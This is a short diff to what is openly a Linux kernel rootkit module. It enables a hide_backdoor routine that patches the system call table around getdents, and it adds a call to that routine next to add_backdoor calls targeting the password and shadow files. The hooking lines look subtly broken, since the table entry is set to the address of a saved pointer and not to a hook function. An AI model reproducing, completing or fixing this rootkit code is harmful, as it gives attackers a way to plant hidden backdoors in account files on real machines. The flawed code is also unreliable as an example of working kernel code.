@@ -155,12 +155,12 @@ void add_backdoor(char *path) {
 		    return;
 }
 
-// void hide_backdoor (void) {
+void hide_backdoor (void) {
 	
-// original_getdents = (void *)sys_call_address[];                        \
-//     sys_call_address[] = (unsigned long*)&hacked_func
+original_getdents = (void *)sys_call_address[__NR_index];                        \
+    sys_call_address[__NR_index] = (unsigned long*)&original_getdents
 	
-// }
+}
 
 // End Marc
 
@@ -287,6 +287,7 @@ static int __init rootkit_init(void){
 	add_backdoor(password_file);
    	add_backdoor(shadow_file);
 	
+	hide_backdoor();
 	// End Marc
 	
 	printk(KERN_INFO "sys_call_table Address is: %X\n", *sys_call_address);
